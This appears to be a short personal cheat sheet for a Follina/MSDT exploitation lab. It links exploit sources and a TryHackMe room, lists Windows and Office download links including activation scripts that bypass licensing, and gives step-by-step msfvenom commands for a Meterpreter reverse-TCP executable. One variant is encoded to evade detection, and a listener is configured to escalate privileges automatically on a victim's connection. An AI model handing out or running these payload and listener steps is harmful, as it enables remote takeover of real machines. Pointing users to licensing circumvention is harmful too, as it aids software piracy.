## Follina Source:

- [MS-MSDT "Follina" Attack Vector](https://github.com/JohnHammond/msdt-follina)

- [TryHackMe | Follina MSDT](https://tryhackme.com/room/follinamsdt)

## Office Installation:

- [Microsoft Activation Scripts](https://github.com/massgravel/Microsoft-Activation-Scripts)

- [Microsoft Office C2R Custom Install](https://gravesoft.dev/office_c2r_custom)

- [Microsoft Office 2016 Professional x64 (64-bit)](https://archive.org/download/office-16.x-64.en-us/Office16.x64.en-US.ISO)

- [Microsoft 2016 Professional Retail x64 (64-bit)](https://officecdn.microsoft.com/db/492350F6-3A01-4F97-B9C0-C7C6DDF67D60/media/en-US/ProfessionalRetail.img)

## OS Virtual Hard Disk or Developer Enviroment:

- [Windows Server 2019 Version 1809 (17763.737)](https://software-download.microsoft.com/download/pr/17763.737.amd64fre.rs5_release_svc_refresh.190906-2324_server_serverdatacentereval_en-us_1.vhd)

- [Windows Server 2019 Version 1809 (17763.1)](https://software-download.microsoft.com/download/pr/17763.1.amd64fre.rs5_release.180914-1434_server_serverdatacentereval_en-us.vhd)

- [Windows 10 Enterprise Evaluation (19H1)](https://download.microsoft.com/download/b/7/a/b7a6fb6e-cae1-4e19-9249-205803bc4ada/WinDev2004Eval.VMware.zip)

- [Windows 11 Enterprise Evaluation (24H2)](https://download.microsoft.com/download/1/4/6/1468925f-d912-4436-8582-4cfdc66e18fc/WinDev2407Eval.VirtualBox.zip)

## Using msfvenom for Reverse TCP Payload

1. **Check Payload Options**:
   
   ```
   msfvenom --payload-options -p windows/meterpreter/reverse_tcp
   ```
2. **Generate Basic Payload**:
   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=4444 -f exe -o payload.exe
   ```
   - `-p`: Payload type (Meterpreter reverse TCP for Windows).
   - `LHOST`: Attacker's IP.
   - `LPORT`: Listener port (default 4444).
   - `-f exe`: Output as Windows executable.
   - `-o`: Output file path.
3. **Generate Encoded Payload** (Evade Detection):
   ```
   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o encoded_payload.exe
   ```
   - `-a x86`: 32-bit architecture.
   - `-b "\x00"`: Avoid bad characters.
   - `-e`: Encoder (Shikata Ga Nai).
   - `-i 3`: Encoding iterations.
4. **Verify File**:
   ```
   ls
   file payload.exe  # Confirms PE32 executable
   ```

## Setup Listener (in msfconsole)
Run `msfconsole` with privilege escalation.

 ```
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST <your_IP>
 set LPORT 4444
 set AutoRunScript getsystem
 exploit
 ```
 Waits for victim connection.
